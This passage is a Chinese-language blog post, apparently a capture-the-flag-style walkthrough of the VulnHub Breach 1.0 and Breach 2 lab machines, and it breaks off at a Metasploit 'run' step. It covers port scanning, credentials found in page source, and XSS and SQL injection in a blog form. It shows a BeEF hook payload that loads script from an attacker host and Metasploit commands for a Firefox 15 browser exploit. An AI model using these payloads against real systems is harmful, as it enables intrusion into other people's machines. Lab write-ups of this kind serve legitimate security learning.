@@ -1,0 +1,1425 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="title:vulhub靶机breach系列date:2025-04-02 20.33vulnhub之breach系列breach : 1.0用masscan扫描端口 发现全端口开放??   还以为我靶机出问题了   看了一眼wp发现确实是这样   我们在进行masscan端口扫描时打开了所有端口，这听起来好像服务器位于 IDS 或 IPS 后面。   只能手动检查端口 先80端口    Ini">
+<meta property="og:type" content="article">
+<meta property="og:title" content="YxY">
+<meta property="og:url" content="http://example.com/2025/06/09/vulhub%E9%9D%B6%E6%9C%BAbreach%E7%B3%BB%E5%88%97/index.html">
+<meta property="og:site_name" content="YxY">
+<meta property="og:description" content="title:vulhub靶机breach系列date:2025-04-02 20.33vulnhub之breach系列breach : 1.0用masscan扫描端口 发现全端口开放??   还以为我靶机出问题了   看了一眼wp发现确实是这样   我们在进行masscan端口扫描时打开了所有端口，这听起来好像服务器位于 IDS 或 IPS 后面。   只能手动检查端口 先80端口    Ini">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453784.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453774.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453832.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453108.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453080.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453071.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453871.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453839.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453808.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453030.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453280.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453321.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453476.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453546.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453579.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453599.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453322.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453258.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453360.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453586.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453773.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453674.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453964.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453005.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453198.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453123.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453272.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453539.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453721.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453843.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453979.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453273.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453265.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453313.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453922.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453059.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453125.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453453.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453495.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453594.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453755.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453832.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453999.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453257.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453394.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453387.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453527.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453490.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453962.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453069.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453128.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453165.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453594.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453618.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453763.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453911.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453881.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453068.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453162.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453392.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453449.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453457.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453505.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453581.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453718.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453953.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453057.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453172.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453220.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453324.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453410.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453516.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453687.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453785.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453850.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453163.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453191.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453313.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453546.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453764.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453596.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453851.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454044.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454435.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454836.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454094.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454090.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454348.png">
+<meta property="og:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091454456.png">
+<meta property="article:published_time" content="2025-06-09T06:53:29.364Z">
+<meta property="article:modified_time" content="2025-06-09T06:54:37.496Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453784.png">
+  
+  
+  
+  <title>YxY</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"se6YF0XKcnw13arWgvFBsXbS-gzGzoHsz","app_key":"6WQ33Kdt8DUo1OCXIeenGsIp","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>YxY</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-09 14:53" pubdate>
+          2025年6月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <hr>
+<h2 id="title-vulhub靶机breach系列date-2025-04-02-20-33"><a href="#title-vulhub靶机breach系列date-2025-04-02-20-33" class="headerlink" title="title:vulhub靶机breach系列date:2025-04-02 20.33"></a>title:vulhub靶机breach系列<br>date:2025-04-02 20.33</h2><h2 id="vulnhub之breach系列"><a href="#vulnhub之breach系列" class="headerlink" title="vulnhub之breach系列"></a>vulnhub之breach系列</h2><h3 id="breach-1-0"><a href="#breach-1-0" class="headerlink" title="breach : 1.0"></a>breach : 1.0</h3><p>用masscan扫描端口 发现全端口开放??  </p>
+<p>还以为我靶机出问题了  </p>
+<p>看了一眼wp发现确实是这样  </p>
+<p>我们在进行<code>masscan</code>端口扫描时打开了所有端口，这听起来好像服务器位于 IDS 或 IPS 后面。  </p>
+<p>只能手动检查端口 先80端口  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453784.png" srcset="/img/loading.gif" lazyload alt="1731644942461"></p>
+<p>Initech被攻破，董事会投票决定让他们内部的Initech网络咨询公司LLP分部来协助。鉴于此次违规的高调性质和近乎灾难性的损失，随后出现了许多针对该公司的企图。Initech已经指派他们的顶级顾问，由比尔·兰伯格、CISSP和彼得·吉本斯领导，C|EH、SEC+、NET+、A+来遏制和执行对违规的分析。 该公司几乎没有意识到，这次入侵并不是熟练黑客所为，而是一名心怀不满的前员工在离职时送的临别礼物。顶级顾问一直在努力控制漏洞。但是，他们自己的工作道德和留下的烂摊子，可能就是公司的败笔。  </p>
+<p>查看源代码 解码后是这样   </p>
+<p>pgibbons:damnitfeel$goodtobeagang$ta  </p>
+<p>像是一个账号密码?  </p>
+<p>除此之外 还有一个隐藏的目录 </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;initech.html&quot;</span> <span class="hljs-attribute">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>目录扫描 只发现images目录 但是里面似乎没有什么东西  </p>
+<p>进入隐藏目录  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453774.png" srcset="/img/loading.gif" lazyload alt="1731646149697"></p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453832.png" srcset="/img/loading.gif" lazyload alt="1731646336957"></p>
+<p>源代码如上  </p>
+<p>看上去有价值的信息有两个 一个是那个user.php那个目录 而且还附带的有一个cms的名字 impress  </p>
+<p>还有一个是下面的那个webmaster??  </p>
+<p>先进入那个目录看看  </p>
+<p>进不去  </p>
+<p>可能是我改过这个靶机的网络配置文件的原因 回头过去看看发现他说 </p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">VM</span> 配置了一个静态 <span class="hljs-selector-tag">IP</span> 地址 (<span class="hljs-number">192.168</span>.<span class="hljs-number">110.140</span>)，因此您需要将仅主机适配器配置到此子网。“– <span class="hljs-selector-attr">[mrb3n]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.vulnhub.com/author/mrb3n,293/)</span><br></code></pre></td></tr></table></figure>
+
+<p>因此这个靶机应该自己新建一张虚拟网卡 网段选择上面这个网段 然后把虚拟机的虚拟网卡选这张就行了  </p>
+<p>接下来是wp  </p>
+<p>登录进去之后 发现3封邮件…….  </p>
+<p><a target="_blank" rel="noopener" href="https://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1/">https://f4l13n5n0w.github.io/blog/2016/11/29/vulnhub-breach-1/</a>  </p>
+<p>有强度的 感觉这个系列的靶机 或许是因为我好久没打了  </p>
+<h3 id="breach-2"><a href="#breach-2" class="headerlink" title="breach 2"></a>breach 2</h3><p>按照上面的问题  </p>
+<p>重新建了一张虚拟网卡 将靶机选择这个网卡 同时攻击机也放进这个网段里面  </p>
+<p>进攻击机里面发现没有这个网段的ip  </p>
+<p>要先ipconfig一下 确认是否存在 <code>eth1</code>（对应新增网卡)  </p>
+<p>如果没有的话 那就直接对这张网卡重新获取ip  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> dhclient eth1  <br></code></pre></td></tr></table></figure>
+
+<p>如果还是没有成功的话 可以尝试手工进行分配  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip </span>addr <span class="hljs-built_in">add</span> 192.168.110.X/24 dev eth1<br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> eth1 up<br></code></pre></td></tr></table></figure>
+
+<p>配置好之后 应该能进行主机发现了 命令得换一下 因为是换了一张网卡  </p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp-scan -<span class="hljs-selector-tag">I</span> eth1 -l 或者 netdiscover -<span class="hljs-selector-tag">i</span> eth1 -<span class="hljs-attribute">r</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">110.0</span>/<span class="hljs-number">24</span> <br></code></pre></td></tr></table></figure>
+
+<p>namp扫描  </p>
+<p>namp -sV -sS -T4 -p- 192.168.110.151  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453108.png" srcset="/img/loading.gif" lazyload alt="1731670617074"></p>
+<p>先看那个65535端口上面的ssh  </p>
+<p>尝试连接  </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">192.168.110.151</span> -p <span class="hljs-number">65535</span>  <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453080.png" srcset="/img/loading.gif" lazyload alt="1731670757698"></p>
+<p>发现是peter这个用户名  </p>
+<p>所以ssh连接的命令应该是这样  </p>
+<p>ssh <a href="mailto:&#x70;&#x65;&#x74;&#101;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x31;&#x31;&#x30;&#46;&#x31;&#53;&#x31;">peter@192.168.110.151</a> -p 65535  </p>
+<p>然后密码是他妈的inthesource  </p>
+<p>连接成功之后马上被断开  </p>
+<p>现在尝试重新进行端口扫描 发现现在开放了80端口  </p>
+<p>访问 查看源代码  </p>
+<p>没有什么有用的 只有几句注释  </p>
+<!--I like hints! Here at Initech we don't trust our users and either should you!-->  
+
+<!--I'm not just going to stick creds here, really, I'm not. Sorry-->  
+
+<p>尝试扫描目录  </p>
+<p>发现一个blog的目录  </p>
+<p>逛了一圈发现那个search那可能有点问题  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453071.png" srcset="/img/loading.gif" lazyload alt="1731671579910"></p>
+<p>这里想试试能不能直接读敏感文件 但是没有读出来 反倒是 直接回显出了我输入的东西  </p>
+<p>有点像xss 再看看sql注入  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453871.png" srcset="/img/loading.gif" lazyload alt="1731671825022"></p>
+<p>确实是这样  </p>
+<p>除了这样去猜测并且发现xss之外  </p>
+<p>网站的下面还有一句  </p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Powered</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-attr">[www.blogphp.net]</span>(<span class="hljs-attribute">http</span>:<span class="hljs-comment">//www.blogphp.net/)  </span><br></code></pre></td></tr></table></figure>
+
+<p>尝试去搜索这个blogphp的历史漏洞  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453839.png" srcset="/img/loading.gif" lazyload alt="1731672756115"></p>
+<p>也能找到相关的东西 并且能找到详细利用的方法  </p>
+<p>使用beef-xss平台 尝试用这个平台的xss攻击语句将这个靶机上线到我的攻击机上面  </p>
+<p>直接按照上面的打法 找到<a target="_blank" rel="noopener" href="http://192.168.110.151/blog/register.html%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80">http://192.168.110.151/blog/register.html这个地址</a>  并且username那里输入xss的payload  </p>
+<p>剩下的密码 邮箱随便填  </p>
+<p>但是这里死活上线不了  </p>
+<p>然后我意识到我又踩坑了 因为我攻击机为了跟靶机处于同一网段 所以额外加了一张处于靶机网段的一张网卡 所以上线的用的payload也应该使用这个网段里面的ip  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://&lt;IP&gt;:3001/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>  但是呢 beef-xss 里面的配置文件的默认ip写的又是另外的ip 要改就很麻烦 所以明天再打吧 明天把nat模式的ip改一下 改成那个网段应该就好了 但是还有可能 改变网段之后 配置里面的ip依然不会改变 那么就只能修改配置文件了  </p>
+<p>按照上面的说法 修改配置文件之后 重新打一遍  </p>
+<p>如图所示 收到了回应 </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453808.png" srcset="/img/loading.gif" lazyload alt="1731826179737"></p>
+<p>一般来说 通过xss都是想要得到cookie里面的内容是什么 看看是否能够伪造之类的  </p>
+<p>但是这次的cookie没有办法解码  </p>
+<p>看wp知道 要关注火狐浏览器的版本 也就是  </p>
+<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202506091453030.png" srcset="/img/loading.gif" lazyload alt="1731826855354"></p>
+<p>可以看到写的是 Firefox 版本 15  </p>
+<p>msf里面刚好就有一个模块  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/multi/</span>browser/firefox_proto_crmfrequest<br></code></pre></td></tr></table></figure>
+
+<p>关于这个模块里面的一个option里面的字段 叫 <strong>SRVHOST</strong>  </p>
+<p>用于定义托管服务（例如反向 HTTP&#x2F;HTTPS&#x2F;FTP 连接）的本地地址。  </p>
+<ul>
+<li><strong>定义监听的主机地址</strong>：<ul>
+<li><code>SRVHOST</code> 指定 Metasploit 在本地监听服务时使用的 IP 地址。</li>
+<li>如果目标系统需要连接到攻击者的机器（例如通过浏览器漏洞、恶意文件下载），目标需要通过 <code>SRVHOST</code> 指定的 IP 找到攻击者的服务。</li>
+</ul>
+</li>
+<li><strong>默认值</strong>：<ul>
+<li>默认情况下，<code>SRVHOST</code> 的值是 <code>0.0.0.0</code>，表示监听所有本地可用的网络接口。</li>
+</ul>
+</li>
+</ul>
+<p>还有一个熟知的就是 LHOST  </p>
+<p><strong>区别</strong>  </p>
+<p><code>LHOST</code> 通常用于反向连接监听，例如 <code>payload</code> 回连到攻击者的 IP。   </p>
+<p>还有一个字段 叫 <strong>URIPATH</strong>  </p>
+<p>在使用 Metasploit 的漏洞模块时（如浏览器漏洞或钓鱼攻击），<code>URIPATH</code> 决定了生成的恶意 URL 的路径。例如，如果设置 <code>URIPATH</code> 为 <code>exploit</code>，目标将访问类似以下链接：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">http:</span>//&lt;<span class="hljs-title class_">SRVHOST</span>&gt;<span class="hljs-symbol">:&lt;SRVPORT&gt;/exploit</span><br></code></pre></td></tr></table></figure>
+
+<p>这是一个浏览器相关的漏洞 所以 lhost和lport可以不用管他 当然设置了也无所谓 我也设置了  </p>
+<p><strong>use exploit&#x2F;multi&#x2F;browser&#x2F;firefox_proto_crmfrequest</strong></p>
+<p><strong>set SRVHOST 192.168.110.128</strong></p>
+<p><strong>set URIPATH pwned</strong></p>
+<p><strong>show payloads</strong></p>
+<p><strong>set payload 2</strong></p>
+<p>直接上面这些 </p>
+<p>那个path也可以不用设置  </p>
+<p>然后直接run  </p>
